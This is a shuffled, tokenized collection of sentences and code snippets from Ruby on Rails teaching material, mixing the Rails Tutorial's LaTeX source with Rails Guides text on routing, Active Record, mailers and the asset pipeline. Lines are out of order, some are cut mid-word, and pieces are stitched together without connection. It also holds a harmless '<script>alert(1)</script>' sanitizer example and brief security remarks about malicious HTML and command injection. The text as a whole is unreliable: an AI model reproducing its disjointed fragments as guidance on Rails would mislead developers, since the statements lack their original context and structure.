Tue , 31 Aug 2010 23 : 59 : 59 UTC + 00 : 00
Regexp ▖ new ( &apos; ▖ &apos; ) ▖ multiline ?
╼ ╼ \ begin { verbatim }
Even with hints , they are \ emph { much } more difficult than the book &apos;s end-of-chapter exercises , so don &apos;t be discouraged if you can &apos;t solve them without considerable effort .
When you alter a template , Rails will check the file &apos;s modification time and recompile it in development mode .
To do this , you need to ╼ get your Rails application server running .
Here &apos;s how this could be declared :
The `collection ▖ where` method finds objects within the collection based on the conditions supplied but the objects are loaded lazily meaning that the database is queried only when the object ( s ) are accessed ▖ ╼ ╼
Pages to display followed users and followers will resemble a hybrid of the user profile page and the user index page ( Section ~ \ ref { sec : users _ index } ) , with a sidebar of user information ( including the following stats ) and a list of users .
( This code is a particularly ugly combination of HTML and ERb ; making it prettier is left as an exercise ( Section ~ \ ref { sec : signup _ exercises } ) ▖ )
# # # `multiline ?
To answer these questions , we need to learn how to use Active Record to find user objects .
By the way , it &apos;s worth noting ( since you may see other people use it ) that you can also run the test suite using the \ kode { spec } Rake task :
# gem &apos; guard-rspec &apos; , &apos; 2 ▖ 5 ▖ 0&apos;
The result of submitting a valid email address .
For namespaced controllers you can use the directory notation ▖
The current state of the signup page \ href { http : / / 0 ▖ 0 ▖ 0 ▖ 0 : 3000 / signup } { / signup } .
in Listing ~ \ ref { code : user _ update _ action _ unsuccessful } .
If you don &apos;t already have it , you should \ href { http : / / rubygems ▖ org / pages / download } { download RubyGems } , extract it , and then go to the \ kode { rubygems } directory and run the setup program :
WHERE follower _ id = : user _ id &quot;
As in Section ~ \ ref { sec : layout _ link _ tests } , we &apos;ll use \ kode { assert \ _ select } to test HTML elements of the relevant pages , taking care to check only elements unlikely to change in the future .
As noted briefly in Section ~ \ ref { sec : the _ first _ application } , Bundler is run automatically ( via \ kode { bundle install } ) by the \ kode { rails } command , but in this section we &apos;ll make some changes to the default application gems and run Bundler again .
# # # # # `seconds _ since _ midnight`
If you were to use this inside an engine , it would * * always * * go to the ╼ application &apos;s root ▖
It &apos;s necessary not to set or leave ` : nullify` option for those associations ╼ that have `NOT NULL` database constraints ▖
TIP : If you find yourself adding many extra actions to a resourceful route , it &apos;s time to stop and ask yourself whether you &apos;re disguising the presence of another resource .
as shown in Listing ~ \ ref { code : user _ relationships _ association } .
/ * ╼ * ---------------------------------------------------------------------------- ╼ * &quot; THE BEERWARE LICENSE &quot; ( Revision 43 ) : ╼ * Michael Hartl wrote this code .
def products _ layout
Under certain circumstances this would present the malicious HTML to the victim ▖
There exist two options for `scope` to customize shallow routes ▖
The first is ╼ moving the files from `public / ` to the new locations ▖
# &lt; contributors type = &quot; array &quot; &gt;
Listing ~ \ ref { code : micropost _ order _ test } relies on having some micropost fixtures , which we define as shown in Listing ~ \ ref { code : micropost _ fixtures } .
NOTE : Defined in `active _ support / core _ ext / load _ error ▖ rb` .
This would produce the following header :
As with the Users resource , we &apos;ll generate scaffold code for the Microposts resource using \ kode { rails generate scaffold } , in this case implementing the data model from Figure ~ \ ref { fig : demo _ micropost _ model }
Provides methods for converting numbers into formatted strings ▖
create app / helpers / static _ pages _ helper ▖ rb
As usual , it &apos;s a good idea to verify that the test suite is \ passing \ before proceeding :
In Chapter ~ \ ref { cha : filling _ in _ the _ layout } , we ended with a stub page for creating new users ( Section ~ \ ref { sec : user _ signup } ) .
Our first step is to add Bootstrap , which in Rails applications can be accomplished with the \ texttt { bootstrap-sass } gem , as shown in Listing ~ \ ref { code : bootstrap _ sass } .
Click around !
* How to use the built-in Active Record validation helpers .
ection { Exercises } ╼ \ label { sec : exercises _ remember _ me } ╼ ╼ \ input { fragments / society _ exercises _ note } ╼ ╼ \ begin { enumerate } ╼ \ item By inspecting your browser &apos;s cookies directly , verify that the ``remember me &apos; &apos; checkbox is having its intended effect ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-0c1e96 &apos; &gt; &lt; / span &gt; ╼ ╼ \ item At the console , invent examples showing both possible behaviors of the ternary operator ( Box ~ \ ref { aside : ternary _ operator } ) ▖ ╼ % = &lt; span class = &apos; exercise &apos; id = &apos; ex-63ac73 &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ % section remember _ me ( end ) ╼ ╼ \ section { Remember tests } % ( fold ) ╼ \ label { sec : remember _ tests } ╼ ╼
Without associations , the model declarations would look like this :
RedCloth ▖ new ( &apos; &lt; script &gt; alert ( 1 ) &lt; / script &gt; &apos; , &#91; : filter _ html &#93; ) ▖ to _ html
When queries are executed on this model , the SQL query will now look something like ╼ this :
Here , we expect it to be more complicated , something like this :
The way to do this is with the \ kode { cookies } method , which ( as with \ kode { session } ) we can treat as a hash .
If this example strikes you as a bit contrived , good---this is by design .
# Try to log in before activation .
scope : created _ before , - &gt; ( time ) { where ( &quot; created _ at &lt; ? &quot; , time ) }
The ` : before` key in the options hash can be specified to specify which initializer this new initializer must run before , and the ` : after` key will specify which initializer to run this initializer _ after _ .
mail ( to : user ▖ email ) do &#124; format &#124;
They are designed to be a sanity check , not to be comprehensive .
Using `render : text` may pose a security risk , as the content is sent as ╼ `text / html` .
The feed for a user ( id 1 ) following users 2 , 7 , 8 , and 10 .
Unfortunately , the User request spec is now broken because the signup and edit forms use the old version of the error messages partial .
&lt; img src = &apos; http : / / us ▖ i1 ▖ yimg ▖ com / us ▖ yimg ▖ com / i / us / nt / ma / ma _ mail _ 1 ▖ gif&apos;
Instead of returning a path such as ` / assets / smile ▖ png` ( digests are left out ╼ for readability ) ▖
You should also update your application ╼ file ( in `config / application ▖ rb` ) :
The \ kode { rails new } command automatically generates a \ kode { ▖ gitignore } file appropriate to a Rails project , but you can add additional patterns as well
Note that the Rails generator automatically appends \ kode { \ _ test } to the name of the test file .
Rails will then output a `script` tag such as this :
&quot; &quot; ▖ html _ safe + &quot; &lt; &quot; ▖ html _ safe # = &gt; &quot; &lt; &quot;
Creating a demo app repository at GitHub ▖ ~ \ href { http : / / railstutorial ▖ org / images / figures / create _ demo _ repo _ 4 _ 0-full ▖ png } { ( full size ) }
@ book = Book ▖ find ( params &#91; : id &#93; )
Variable title
The order in which helpers from more than one directory are loaded has changed in Rails 4 ▖ 0 ▖
= &gt; Call with -d to detach
\ emph { Ruby on Rails Tutorial : Learn Web Development with Rails } .
The inheritance hierarchy for the Users and Microposts controllers .
create spec / models / user _ spec ▖ rb
* ` : restrict _ with _ exception` causes an exception to be raised if there is an associated record
&#124; PATCH / PUT &#124; / geocoder &#124; geocoders # update &#124; update the one and only geocoder resource &#124;
Here the connection information in `ENV &#91; &apos; DATABASE _ URL &apos; &#93; ` is ignored , note the different adapter and database name .
users = User ▖ all
Showing the users the given user is following .
X = : in _ M
For a dated but still useful discussion of this issue , see the \ href { http : / / blog ▖ hasmanythrough ▖ com / 2008 / 4 / 2 / simple-pages } { simple pages post on hasmanythrough } .
&lt; % = expensive _ files _ operation % &gt;
Rails will now prepend &quot; / app1 &quot; when generating links .
With the data modeling complete , we &apos;re now ready to add the code needed to send an account activation email .
As you can verify by inspecting the navigation in your browser , once Rails has processed the layout and evaluated the embedded Ruby the list looks like this
Creating an issue like this is mostly to help yourself start on the path of fixing the problem and for others to confirm it with an &quot; I &apos;m having this problem too &quot; comment .
* ` : nullify` causes the foreign key to be set to `NULL` ▖
if @ article ▖ update ( article _ params )
* Convert the supplied options to an equivalent SQL query .
The logout link , meanwhile , uses the logout path defined in Listing ~ \ ref { code : sessions _ resource } :
That seems to me a logical division , but putting them all in the \ kode { shared } folder certainly works fine , too .
This means the methods `sanitize` , `sanitize _ css` , `strip _ tags` and ╼ `strip _ links` are backed by a new implementation .
# @ business and @ user instance variables here
belongs _ to : customer , inverse _ of : : orders
* `config ▖ action _ dispatch ▖ tld _ length` sets the TLD ( top-level domain ) length for the application ▖
This means that , even if our database is compromised , our users &apos; passwords will still be secure .
NOTE : While these column names are optional , they are in fact reserved by Active Record ▖
data : { confirm : &apos; Are you sure ? &apos;
Date : Sun , 24 Jan 2010 12 : 15 : 53 GMT
# # # Rails DOM Testing
INSERT INTO clients ( created _ at , first _ name , locked , orders _ count , updated _ at ) VALUES ( &apos; 2011-08-30 05 : 22 : 57 &apos; , &apos; Andy &apos; , 1 , NULL , &apos; 2011-08-30 05 : 22 : 57 &apos; )
\ chapter { Following users } ╼ \ label { cha : following _ users } ╼ ╼
/ users / 1 / followers
# = &gt; 123-555-1234
There are three caveats :
def set _ author
as shown in Listing ~ \ ref { code : micropost _ ordering } .
# # # CDNs
This is covered in depth in the &#91; Configuring Middleware &#93; ( # configuring-middleware ) section below .
create app / views / users / index ▖ json ▖ jbuilder
If you enter a wish list item in GitHub Issues with no code , you ╼ can expect it to be marked &quot; invalid &quot; as soon as it &apos;s reviewed .
Action Mailer Callbacks
The reason is that the engine may be installed as a ╼ gem ▖
See the \ href { http : / / api ▖ rubyonrails ▖ org / v4 ▖ 2 ▖ 2 / classes / ActiveRecord / Callbacks ▖ html } { Rails API entry on callbacks } for more information on which callbacks Rails supports .
2 ▖ kilobytes # = &gt; 2048
Good basic tests for signing up users .
&lt; h1 &gt; Names of all the people &lt; / h1 &gt;
def perform ( * args )
Luckily , the solution is straightforward to implement : we just need to enforce uniqueness at the database level as well as at the model level .
It is very easy to create Active Record models ▖
# = &gt; Mon , 09 Aug 2010 00 : 00 : 00 UTC + 00 : 00 ▖ .
Addition only assumes the elements respond to ` + ` :
Defaults to `false` and will use Active Record by default .
C : \ Sites &gt; echo &quot; hello , world &quot;
You &apos;ll see that Ryan Bates himself often uses TDD for real-life development , and in fact his testing style is similar to the style used in this tutorial ▖ )
Instead of assuming all public methods are designed for user consumption , Rails uses the ` : nodoc : ` directive to annotate these kinds of methods as internal API .
The tests initially fail , as required :
# Handle a successful update .
In the early days of migrations , the filenames were prefixed with incrementing integers , which caused conflicts for collaborating teams if multiple programmers had migrations with the same number .
def check _ credit _ limit ( order )
This requires the use of the ``not &apos; &apos; operator , written using an exclamation point ~ \ kode { ! } and usually read as ``bang &apos; &apos; .
Of course , at this point the tests should fail :
The Home page with a title .
To duplicate relatively simple objects such as arrays , we can use the \ kode { dup } method :
Relevant if `config ▖ cache _ classes` is false , which is the case in development mode by default ▖
The \ kode { nav } and \ kode { pull-right } classes on the \ kode { ul } tag have special meaning to Bootstrap .
in Listing ~ \ ref { code : minimum _ password _ length _ test } .
class _ name : &quot; Order &quot; ,
# Find the clients with primary keys 1 and 10 .
class _ name = name ▖ to _ s ▖ camelize
Create a new file `app / views / articles / _ form ▖ html ▖ erb` with the following ╼ content :
# label ( : article , : title )
See the Rails Guide on the \ href { http : / / guides ▖ rubyonrails ▖ org / active _ record _ querying ▖ html } { Active Record Query Interface } for more on \ kode { where } and the like .
* `collection _ singular _ ids`
* FROM `users` INNER JOIN `articles` ON `articles` ▖ `user _ id` = `users` ▖ `id` WHERE `users` ▖ `id` = 1
def index
# # # # # CDNs and the Cache-Control Header
A countermeasure is to _ use the `system ( command , parameters ) ` method which passes command line parameters safely _ .
Using Initializer Files
This suggests placing the method in \ kode { user ▖ rb } .
The reason for the common view is that the ERb is nearly identical for the two cases , and Listing ~ \ ref { code : show _ follow _ view } covers them both .
Although Rails is designed for making database-backed dynamic websites , it also excels at making the kind of static pages we might make with raw HTML files .
as shown in Listing ~ \ ref { code : user _ update _ action _ unsuccessful } .
This is one of the most ╼ important parts about namespacing , and is discussed later in the ╼ &#91; Routes &#93; ( # routes ) section of this guide .
For example , if ╼ you called your JavaScript file `app / assets / javascripts / projects ▖ js ▖ erb ▖ coffee` ╼ then it would be processed with the CoffeeScript interpreter first , which ╼ wouldn &apos;t understand ERB and therefore you would run into problems .
Article ▖ where ( trashed : true ) ▖ where ( trashed : false )
When we last left the Home page , it appeared as in Figure ~ \ ref { fig : sample _ app _ logo } ---that is , it had a ``Sign up now ! &apos; &apos; button in the middle .
Finally , we &apos;ll add some rules to style the site &apos;s logo , which simply consists of the text ``sample app &apos; &apos; .
&lt; p &gt;
The result should be a working sample application on the production server :
# # # # # CDN Request Caching
# # # Removing All Scoping
Accept-Ranges :
The option ` : separator` can be a regexp :
We &apos;ll implement this in Listing ~ \ ref { code : microposts _ home _ page } below .
&lt; script src = &quot; / assets / application-908e25f4bf641868d8683022a5b62f54 ▖ js &quot; &gt; &lt; / script &gt;
╼ ╼ \ subsection { Prerequisites } % ( fold ) ╼ \ label { sec : prerequisites } ╼ ╼ There are no formal prerequisites to this book , and the \ emph {
resources : drafts
For example , an attacker with access to the database could immediately activate newly created accounts , thereby logging in as the user , and could then change the password to gain control .
But it &apos;s enough to get us started , and we &apos;ll finish the implementation in Section ~ \ ref { sec : strong _ parameters } .
The final step needed to complete the Users resource is to add delete links and a \ kode { destroy } action .
If you ever ╼ meet them , don &apos;t forget to say thanks !
in Listing ~ \ ref { code : authenticated _ p } .
resources : comments , shallow : true
B ▖ x = : b
* `action _ controller ▖ logger` Sets `ActionController : : Base ▖ logger` - if it &apos;s not already set - to `Rails ▖ logger` .
The inheritance hierarchy for the Users and Microposts controllers .
The documentation for `PermitScrubber` and `TargetScrubber` explains how you ╼ can gain complete control over when and how elements should be stripped .
with name \ kode { &quot; user &#91; email &#93; &quot; } is precisely the \ kode { email } attribute of the \ kode { user } hash .
As a bonus , by using base64 strings specifically designed to be safe in URLs ( as indicated by the name \ kode { urlsafe \ _ base64 } ) , we &apos;ll be able to use the same token generator to make account activation and password reset links in Chapter ~ \ ref { cha : account _ activation _ and _ password _ resets } .
When an engine is created , it may want to use specific classes from an ╼ application to provide links between the pieces of the engine and the pieces of ╼ the application ▖
The project &apos;s name is a pun on Spork &apos;s use of \ href { http : / / en ▖ wikipedia ▖ org / wiki / POSIX } { POSIX } \ href { http : / / en ▖ wikipedia ▖ org / wiki / Fork _ ( software _ development ) } { forks } .
For cases such as the one in this chapter , the advantage over Active Record may not be obvious , but we &apos;ll use more advanced features of factories in future chapters .
in Listing ~ \ ref { code : signed _ in _ p } .
scope : active , - &gt; { unscope ( where : : state ) ▖ where ( state : &apos; active &apos; ) }
User delete links ( viewable only by admins ) .
Having handled invalid form submissions , now it &apos;s time to complete the signup form by actually saving a new user ( if valid ) to the database .
\ label { fig : custom _ help _ page } } ╼ \ end { figure } ╼ ╼ % subsection custom _ static _ pages ( end ) ╼ ╼ % section static _ pages ( end ) ╼ ╼ ╼ \ section { Getting started with testing } % ( fold ) ╼ \ label { sec : getting _ started _ with _ testing } ╼ ╼
Our main testing tools will be \ emph { controller tests } ( starting in this section ) , \ emph { model tests } ( starting in Chapter ~ \ ref { cha : modeling _ users } ) , and \ emph { integration tests } ( starting in Chapter ~ \ ref { cha : sign _ up } ) .
Cross-site request forgery ( CSRF ) protection now covers GET requests with ╼ JavaScript responses , too ▖
We &apos;ll define the generalized version of the \ kode { authenticated ? } \ method from Table ~ \ ref { table : password _ token _ digest } in Section ~ \ ref { sec : activating _ the _ account } .
The implementation of the data model in Figure ~ \ ref { fig : user _ has _ many _ followers } parallels Listing ~ \ ref { code : has _ many _ following _ through _ active _ relationships } exactly , as seen in Listing ~ \ ref { code : has _ many _ following _ through _ passive _ relationships } .
d = &apos; ex-ce3907 &apos; &gt; &lt; / span &gt; ╼ \ end { enumerate } ╼ ╼ \ begin { figure } ╼ \ begin { center } ╼ \ image { images / figures / hola _ mundo ▖ png } ╼ \ end { center } ╼ \ caption { Changing the root route to return `` ¡ Hola , mundo ! &apos; &apos; ▖ \ label { fig : hola _ mundo } } ╼ \ end { figure } ╼ ╼ \ begin { figure } ╼ \ begin { center } ╼ \ image { images / figures / goodbye _ world ▖ png } ╼ \ end { center } ╼ \ caption { Changing the root route to return ``goodbye , world ! &apos; &apos; ▖ \ label { fig : goodbye _ world } } ╼ \ end { figure } ╼ ╼ % subsection hello _ world ( end ) ╼ ╼ % section up _ and _ running ( end ) ╼ ╼ \ section { Version control with Git } % ( fold ) ╼ \ label { sec : version _ control } ╼ ╼
\ texttt { POST } is the next most common operation ; it is the request sent by your browser when you submit a form .
( We &apos;ll make the last one in Chapter ~ \ ref { cha : log _ in _ log _ out } ▖ )
* `helper` defines whether or not to generate helpers ▖
These actions don &apos;t typically render pages ( although they sometimes do ) ; instead , their main purpose is to modify information about users in the database .
d ▖ end _ of _ week ( : sunday ) # = &gt; Sat , 08 May 2010
We &apos;ve used the code in Listing ~ \ ref { code : proto _ status _ feed } instead because it generalizes much more naturally to the full status feed needed in Chapter ~ \ ref { cha : following _ users } .
# Custom Rails Tutorial specs
A partial for a follow / unfollow form .
We &apos;ll fix the first issue in Section ~ \ ref { sec : signup _ error _ messages } and the second in Section ~ \ ref { sec : successful _ signups } .
and so ~ on .
Validations are used to ensure that only valid data is saved into your ╼ database ▖
This is typically used when the user needs to agree to your ╼ application &apos;s terms of service , confirm reading some text , or any similar ╼ concept ▖
validates : surname , presence : true , if : &quot; name ▖ nil ? &quot;
\ href { https : / / www ▖ codeschool ▖ com / } { Code School } : A large variety of interactive programming courses
xml ▖ guid ( @ person ▖ firm ▖ account ▖ url + @ recent _ items ▖ url ( item ) )
config ▖ assets ▖ debug = true
This kind of code requires the existence of a \ kode { logged \ _ in ? } \ boolean method , which we &apos;ll now define .
Unlike the Users resource , which uses a database back-end ( via the User model ) to persist data , the Sessions resource will use a \ href { http : / / en ▖ wikipedia ▖ org / wiki / HTTP _ cookie } { \ emph { cookie } } , which is a small piece of text placed on the user &apos;s browser .
* You must ensure any necessary compressors or minifiers are ╼ available on your development system .
As a final touch , we &apos;ll fill in the URL of the settings link in the site navigation .
Normally , when you `dup` an object that contains other objects , Ruby does not `dup` them , so it creates a shallow copy of the object ▖
To get the test suite to pass , we &apos;ll remove the \ kode { provide } line from the Home page &apos;s view , as seen in Listing ~ \ ref { code : home _ page _ base _ title } .
This guide covers the association features of Active Record .
# # # Choosing Between `has _ many : through` and `has _ and _ belongs _ to _ many`
Removing the contents of the relationship fixture .
\ noindent \ emph { Learn Enough Command Line to Be Dangerous } is an introduction to the command line for complete beginners , the first in a \ href { http : / / learnenough ▖ com / } { series of tutorials } designed to teach the common foundations of ``computer magic &apos; &apos; ( Box ~ \ ref { aside : computer _ magic } ) to as broad an audience as possible .
X = : in _ Object
Create a file called `app / views / articles / edit ▖ html ▖ erb` and make ╼ it look as follows :
This provides a convenient way to display a BigDecimal value in floating-point notation :
umerate } ╼ ╼ % subsection the _ model _ file ( end ) ╼ ╼ \ subsection { Creating user objects } % ( fold ) ╼ \ label { sec : creating _ user _ objects } ╼ ╼
Second , the \ kode { media } argument sure looks like a hash , but where are the curly braces ?
A tempting but useless definition for \ kode { current \ _ user } .
The updated \ kode { Gemfile } also changes the line for jQuery , the default JavaScript library used by Rails , from
Technically , it looks for the least indented line in the whole string , and removes ╼ that amount of leading whitespace .
class Section &lt; ActiveRecord : : Base
The \ kode { Procfile } should be created in your application &apos;s root directory ( i ▖ e ▖ , in the same location as the \ kode { Gemfile } ) .
resources : photos , as : &apos; admin _ photos&apos;
CAUTION : Don &apos;t use `validates _ associated` on both ends of your associations .
This is the first application for
now ▖ all _ year
╼ &gt; &gt; @ user &#124; &#124; = &quot; the user &quot;
# # # # `parent`
In this guide you will learn about engines and how they can be used to provide ╼ additional functionality to their host applications through a clean and very ╼ easy-to-use interface .
i ▖ increment ! ( : views )
def a _ method _ used _ for _ validation _ purposes
$ echo $ DATABASE _ URL
Even at this early stage , it &apos;s helpful to get a high-level overview of how Rails applications work ( Figure ~ \ ref { fig : MVC } ) .
Before moving on to tackle any of the application extensions , it &apos;s a good idea to merge in your changes :
The test appears as in Listing ~ \ ref { code : contact _ page _ test } , which simply follows the model last seen in Listing ~ \ ref { code : pages _ controller _ spec _ title } .
Recommended in `config / environments / development ▖ rb` to minimize unexpected behavior when deploying to `production` .
Here are some suggestions based on my own experience :
# Use ActiveModel has _ secure _ password
The login page with a ``forgot password &apos; &apos; link .
# you &apos;ve limited to : test , : development , or : production .
As we learned in Section ~ \ ref { sec : layouts _ and _ embedded _ ruby } , the \ kode { yield } method inserts the contents of each page into the site layout .
1234567890 ▖ 50 ▖ to _ s ( : currency ) # = &gt; $ 1,234,567,890 ▖ 50
The \ kode { show \ _ follow } view used to render following and followers .
You may prefer just to load all core extensions , there is a file for that :
Defining a \ kode { gravatar \ _ for } helper method .
Testing that microposts are destroyed when users are .
# # # `squish`
Configuration needed for graceful degradation of form submission .
The solution involves pushing the finding of followed user ids into the database using a \ emph { subselect } .
This helper makes building an Atom feed easy ▖
validates : games _ played , numericality : { only _ integer : true }
{ &quot; foo &quot; = &gt; 1 , &quot; bar &quot; = &gt; 2 } ▖ to _ xml
For example , a new Rails 4 application includes a default ╼ `app / assets / javascripts / application ▖ js` file containing the following lines :
Testing the micropost order ▖
Here we somewhat arbitrarily arrange for the first user to follow users ~ 3 through 51 , and then have users 4 through 41 follow that user back .
The additional assertions in Listing ~ \ ref { code : image _ upload _ test } check both for a file upload field on the Home page and for a valid image attribute on the micropost resulting from valid submission .
Let &apos;s focus on one particular line in Listing ~ \ ref { code : application _ layout _ redux } :
The ` : source` option specifies the source association name for a `has _ one : through` association .
Now let &apos;s take a look at the above steps in more detail .
# You can use `rake secret` to generate a secure secret key .
Currently , the test for valid submission should be failing :
I shall be late ! &quot; ▖ truncate _ words ( 4 , separator : / \ s / )
This error occurs because the route needs to have a controller defined in order ╼ to serve the request ▖
The Home page with a link to the signup page .
* * `ActionDispatch : : ShowExceptions` * *
&lt; / body &gt;
find _ by ( region _ id : order _ number &#91; 0 ▖ ▖ 2 &#93; )
Each key is the attribute name and the value is an array of strings with all errors .
def caches _ action ( * actions )
{ title : &quot; RSS Feed &quot; } ) % &gt;
The resulting tests are more advanced than the others we &apos;ve seen , so let &apos;s break them down into pieces ; if you &apos;re new to RSpec , you might want to read this section a couple of times .
We can run all of our JavaScript through a minimizer and ╼ concatenator ▖
CarrierWave adds a Rails generator for creating an image uploader , which we &apos;ll use to make an uploader for an image called \ kode { picture }
/ users / 1 / following
In Section ~ \ ref { sec : activating _ the _ account } , we &apos;ll complete the process by adding some tests and then doing a little refactoring .
These need to be backed up by a migration to create the `assemblies _ parts` table ▖
Here the line
A quick example to illustrate :
We &apos;ll use the state-of-the-art hash function called \ href { http : / / en ▖ wikipedia ▖ org / wiki / Bcrypt } { bcrypt } to irreversibly encrypt the password to form the password hash .
It is not necessary to create a new workspace .
This will generate the following HTML :
By default , this is the ` / assets` directory .
0 ▖ 0 ▖ clone # = &gt; allocator undefined for Float
remove file
As with the command-line prompt , the \ emph { Rails Tutorial } uses the Unix convention for directory separators ( i ▖ e ▖ , a forward slash ~ \ kode { / } ) .
Using the `config / database ▖ yml` file you can specify all the information needed to access your database :
We might write this schematically as follows :
We start by requiring a User object to respond to \ kode { authenticate } :
This \ kode { session } object makes the user id available from page to page by storing it in a cookie that expires upon browser close .
Now running
* `mail` - Sends the actual email itself ▖
You can also specify the ` : shallow` option in the parent resource , in which case all of the nested resources will be shallow :
This simply involves filling in the second arguments of the \ kode { link \ _ to } functions with the proper named routes .
&#124; &#124; 508 &#124; : loop _ detected &#124;
If you have an extension that should be shared by many associations , you can use a named extension module ▖
We &apos;ll see in just a moment the benefits of adding \ kode { has \ _ secure \ _ password } to the User model ( Section ~ \ ref { sec : creating _ a _ user } ) , but first we &apos;ll add a minimal requirement on password security .
We prefer pull requests ╼ that are a single commit ▖
The next step is to make the class that represents a `User` in the application ╼ customizable for the engine ▖
$ rm README ▖ rdoc
What is the Asset Pipeline ?
A test for the \ kode { user ▖ followed \ _ users } attribute .
Because we configured Bundler not to install production gems ( Section ~ \ ref { sec : sample _ app _ setup } ) , Listing ~ \ ref { code : unicorn _ gemfile } won &apos;t add any gems to the development environment , but we still need to run Bundler to update \ kode { Gemfile ▖ lock } :
------------------------------------
1234567 ▖ to _ s ( : human _ size ) # = &gt; 1 ▖ 18 MB
# # # # `last`
# app / jobs / guests _ cleanup ▖ rb
* * `ActionDispatch : : Static` * *
A boolean method for login status inside tests .
# # # # auto _ discovery _ link _ tag
which is included to make sure that
get &apos; books / * section / : title &apos; , to : &apos; books # show&apos;
* `config ▖ action _ dispatch ▖ perform _ deep _ munge` configures whether `deep _ munge` ╼ method should be performed on the parameters ▖
There &apos;s also the bang variant `symbolize _ keys ! ` that symbolizes keys in the very receiver .
NOTE : Defined in `active _ support / core _ ext / module / attribute _ accessors ▖ rb` .
You can use the ` : status` option to change this :
&lt; % = render partial : &quot; product &quot; , collection : @ products ,
profile ▖ name
Active Support defines `Time ▖ current` to be today in the current time zone ▖
Learning about methods such as \ kode { include ? }
in Listing ~ \ ref { code : current _ user _ equals } .
delivery _ method _ options : delivery _ options )
would match `zoo / woo / foo / bar / baz` with `params &#91; : a &#93; ` equals ` &apos; zoo / woo &apos; ` , and `params &#91; : b &#93; ` equals ` &apos; bar / baz &apos; ` .
Finally , it &apos;s worth noting that , in the common case that single and double quotes are essentially interchangeable , you &apos;ll often find that the source code switches between the two without any apparent pattern .
# { severity } &gt; = @ level # DEBUG &gt; = @ level
It &apos;s difficult to be confident that a given validation is doing exactly what we expect it to without writing a failing test and then getting it to pass .
* Then in your view , you can just reference `attachments` as a hash and specify ╼ which attachment you want to show , calling `url` on it and then passing the ╼ result into the `image _ tag` method :
as seen in Listing ~ \ ref { code : from _ users _ followed _ by _ final } .
Creating the toy app repository at Bitbucket .
following
-4 ▖ exabytes # = &gt; -4611686018427387904
number _ to _ human _ size ( 1234567 ) # = &gt; 1 ▖ 2 MB
4 examples , 0 failures
if @ business &amp; &amp; @ business ▖ has _ smtp _ settings ?
In this book , by using SQLite for development and PostgreSQL ( via Heroku ) for deployment ( Section ~ \ ref { sec : deploying } ) , we have developed this theme even further , to the point where we barely ever have to think about how Rails stores data , even for production applications .
user = User ▖ new
When you run this migration it will create ╼ an `articles` table with one string column and a text column ▖
&lt; input id = &quot; person _ first _ name &quot; name = &quot; person &#91; first _ name &#93; &quot; type = &quot; text &quot; / &gt;
page ▖ attachments ▖ create ( {
t ▖ belongs _ to : physician
# # # # # `monday` , `sunday`
We need to check two cases : first , users who aren &apos;t logged in should be redirected to the login page ; second , users who are logged in but who aren &apos;t admins should be redirected to the Home page .
* `config ▖ active _ record ▖ table _ name _ suffix` lets you set a global string to be appended to table names ▖
Recalling that \ kode { authenticate } returns \ kode { false } for an invalid authentication ( Section ~ \ ref { sec : creating _ and _ authenticating _ a _ user } ) , our strategy for user login can be summarized as shown in Listing ~ \ ref { code : find _ authenticate _ user } .
( \ emph { Note } : it &apos;s not ( yet ) very gratifying ▖ )
As a compromise , test what your code obviously affects , and if the change is ╼ not in railties , run the whole test suite of the affected component ▖
&lt; hr &gt;
&lt; % = url _ for ( host : &apos; example ▖ com &apos; ,
The main point is to ensure that all Rails apps will have a job infrastructure ╼ in place , even if it &apos;s in the form of an &quot; immediate runner &quot; ▖
Recalling the \ emph { or } ~ operator \ texttt { &#124; &#124; } seen in Section ~ \ ref { sec : objects _ and _ message _ passing } , we can rewrite this as follows :
If you need to ensure some particular JavaScript ends up ╼ above some other in the concatenated file , require the prerequisite file first ╼ in the manifest ▖
Rails comes with a command-line command called \ kode { rails } that can generate new applications ( \ kode { rails new } ) and run local servers ( \ kode { rails server } ) .
Well , there will still be \ emph { one } thing left that we don &apos;t understand , which is how Rails ties this all together : mapping URLs to actions , making the \ kode { full \ _ title } helper available in views , etc ▖ This is an interesting subject , and I encourage you to investigate it further , but knowing exactly \ emph { how } Rails works is not necessary when \ emph { using } Rails .
2 ▖ ordinalize # = &gt; &quot; 2nd &quot;
This is what is happening here ▖ ╼
* `default Hash` - This is a hash of default values for any email you send from ╼ this mailer ▖
@ open _ orders = @ customer ▖ orders ▖ where ( open : true ) # No query yet
# # # Inflections
Creates a standard input field of date type .
nonexistent
# # # # # `includes`
+ --------- + --------- + ------- + ------ + ------- +
remove empty directory
to debug the error using the Heroku logfile .
pluralize _ table _ names ?
class CreateComments &lt; ActiveRecord : : Migration
authentication : &apos; plain &apos; ,
/ signout
Activating seed users by default .
By default the internal instance variable is named with a leading underscore , ` @ _ log _ level` in the example above ▖
A form to sign up new users .
This guide is an introduction to Active Record .
Here we have reused the shared \ kode { error \ _ messages } partial introduced in Section ~ \ ref { sec : signup _ error _ messages } .
11 ▖ ▖ 27 ) # = &gt; false
We &apos;ve come a long way since introducing the Users controller way back in Section ~ \ ref { sec : user _ signup } .
Defaults to false in development mode , and true in test and production modes ▖ ╼ ╼
Here \ kode { subl } is the command-line command to launch Sublime Text on OS ~ X , which you can set up using the \ href { http : / / www ▖ sublimetext ▖ com / docs / 2 / osx _ command _ line ▖ html } { Sublime Text ~ 2 documentation for the OS ~ X command line } .
Using the \ kode { cookies } method , we create a persistent session by placing a permanent remember token cookie on the browser .
# # # Rendering Partial Collections
In particular , the base title , ``Ruby on Rails Tutorial Sample App &apos; &apos; , is the same for every title test ▖ Using the special function \ kode { setup } , which is automatically run before every test , verify that the tests in Listing ~ \ ref { code : base _ title _ test } are still \ passing .
Communicate to the reader the current way of doing things , both explicitly and implicitly ▖
gem &apos; devise&apos;
Another technique related to models involves undoing \ emph { migrations } , which we saw briefly in Chapter ~ \ ref { cha : a _ toy _ app } and will see much more of starting in Chapter ~ \ ref { cha : modeling _ users } .
And you can tell the method not to fill the last group passing `false` :
The result appears in Listing ~ \ ref { code : sign _ in _ function }
as shown in Listing ~ \ ref { code : add _ store _ location } .
An account activation email sent in production .
# # # Complete List of Action Mailer Methods
This will create routing helpers such as `magazine _ periodical _ ads _ url` and `edit _ magazine _ periodical _ ad _ path` .
╼ * available in this directory and any sub-directories .
# if you &apos;re sharing your code publicly .
* How to run EXPLAIN on relations .
The Rails core team will be notified about your submission .
A test for user logout ▖
authenticated ? ( : reset , token )
create app / controllers / application _ controller ▖ rb
